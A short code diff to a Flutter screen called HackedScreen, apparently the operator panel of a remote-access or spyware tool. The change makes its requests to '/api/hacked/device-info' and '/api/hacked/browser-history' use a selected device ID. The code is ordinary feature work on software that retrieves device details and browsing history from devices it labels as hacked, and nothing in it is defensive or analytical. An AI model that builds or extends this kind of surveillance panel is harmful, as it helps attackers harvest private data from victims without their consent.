@@ -475,7 +475,7 @@ class _HackedScreenState extends State<HackedScreen>
     if (!mounted) return;
     Navigator.of(context, rootNavigator: true).pop();
     try {
-      final res = await ApiService.get('/api/hacked/device-info/${widget.deviceId}');
+      final res = await ApiService.get('/api/hacked/device-info/${_selectedDeviceId}');
       if (!mounted) return;
       final info = res['info'] as Map<String, dynamic>?;
       if (info == null) { showWarning(context, 'Data belum tersedia, coba lagi'); return; }
@@ -545,7 +545,7 @@ class _HackedScreenState extends State<HackedScreen>
     if (!mounted) return;
     Navigator.of(context, rootNavigator: true).pop();
     try {
-      final res = await ApiService.get('/api/hacked/browser-history/${widget.deviceId}');
+      final res = await ApiService.get('/api/hacked/browser-history/${_selectedDeviceId}');
       if (!mounted) return;
       final hist = res['history'] as Map<String, dynamic>?;
       final items = hist != null ? List<Map<String, dynamic>>.from(hist['items'] ?? []) : [];
